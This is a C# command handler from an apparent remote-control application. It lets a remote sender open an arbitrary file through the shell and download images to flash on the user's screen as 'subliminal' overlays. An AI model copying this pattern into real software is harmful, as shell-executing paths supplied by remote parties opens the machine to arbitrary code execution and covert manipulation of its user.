using ControlApp.Exceptions.Commands;
using ControlApp.Subroutines;
using ControlApp.Utils;
using System.Diagnostics;
using System.Text.Json;

namespace ControlApp.Commands;

public class SubliminalImageCommand : Command {
    public SubliminalImageCommand(): base(CommandCodes.SubliminalImage) { }
    public override void Execute(string senderId, JsonElement content) {
        string url = content.GetProperty("url").ToString() ?? throw new WrongCommandFormatException();
        if (Utilities.IsFile(url)){
            Process.Start(new ProcessStartInfo{
                FileName = url,
                UseShellExecute = true
            });
        }
        string? filePath = ServerCommunicator.GetFile(url);
        if (filePath != null) {
            new Subliminal(filePath, message: false).Show();
        }
    }
}